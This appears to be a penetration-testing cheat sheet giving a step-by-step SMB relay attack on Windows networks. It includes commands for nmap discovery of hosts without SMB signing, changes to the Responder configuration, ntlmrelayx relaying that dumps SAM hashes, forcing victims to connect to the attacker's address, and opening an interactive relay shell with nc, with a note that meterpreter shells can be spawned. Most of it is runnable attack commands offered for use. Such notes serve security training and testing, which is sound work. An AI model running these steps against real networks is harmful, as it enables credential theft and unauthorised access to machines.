# SMB Relay Attacks Overview

## What is it?

* instead of cracking hashes gathered with Responder, we can instead relay those hashes to

  specific machines and potentially gain access

## Requirements

* SMB Signing must be disabled on the target
* relayed user credentials must be admin on machine
* cannot relay a hash to a machine that you got from that machine

## Gaining Access with SMB Relay

### Step 1: Discovering Hosts with SMB Signing Disabled

```bash
nmap --script=smb2-security-mode.nse -p445 -Pn 192.168.0.1/24
```

* github has scripts
* Nessus can check too

### Step 2: Put Targets in a Txt

```bash
gedit targets.txt
```

* paste the ip's of the targets with disabled SMB signing

### Step 3: Edit Responder

```bash
sudo gedit /etc/responder/Responder.conf
```

* turn SMB and HTTP to OFF

### Step 4: Run Responder

```bash
sudo responder -I eth0 -rdw
```

### Step 5: Set Up The Relay

```bash
sudo [ntlmrelayx.py](http://ntlmrelayx.py/) -tf targets.txt -smb2support
```

* if you have to restart it: kill -9 
* can use the -c flag to run commands once it is connected or -e to setup a shell, like meterpreter

### Step 6: SMB Relay Fail Event Occurs

* like a user typing in the wrong network drive

```bash
\\<attacker ip>
#can put this into the file browser on the victim machine to force a fail
```

### Step 7: Win

* it runs attack and dumps files, like SAM

### ntlmrelayx Shell

* the output after running the above steps should say something about a SMB shell

```bash
nc 127.0.0.1 11000
```

* type help to see the commands that can be used

